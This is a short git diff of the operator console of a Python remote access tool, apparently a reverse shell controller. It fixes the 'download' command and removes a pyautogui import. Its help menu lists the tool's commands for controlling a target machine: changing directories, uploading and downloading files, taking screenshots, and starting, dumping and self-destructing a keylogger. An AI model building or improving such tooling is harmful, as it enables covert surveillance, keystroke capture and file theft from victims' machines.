@@ -2,7 +2,6 @@ import socket
 from termcolor import colored
 import json
 import os
-import pyautogui
 
 def receive():
     data = ''
@@ -51,7 +50,7 @@ def target_communication():
             pass
         elif command[:6] == 'upload':
             upload_file(command[7:])
-        elif command[5:] == 'dload':
+        elif command[:8] == 'download':
             download_file(command[9:])
         elif command[:10] == 'screenshot':
                 file = open(f'screenshot{count}.png', 'wb')
@@ -72,7 +71,7 @@ def target_communication():
             clear                               --> Clear The Screen
             cd *Directory Name*                 --> Changes Directory On Target System
             upload *file name*                  --> Upload File To The target Machine
-            dload *file name*                   --> Download File From Target Machine
+            download *file name*                   --> Download File From Target Machine
             keylog_start                        --> Start The Keylogger
             keylog_dump                         --> Print Keystrokes That The Target Inputted
             keylog_stop                         --> Stop And Self Destruct Keylogger File
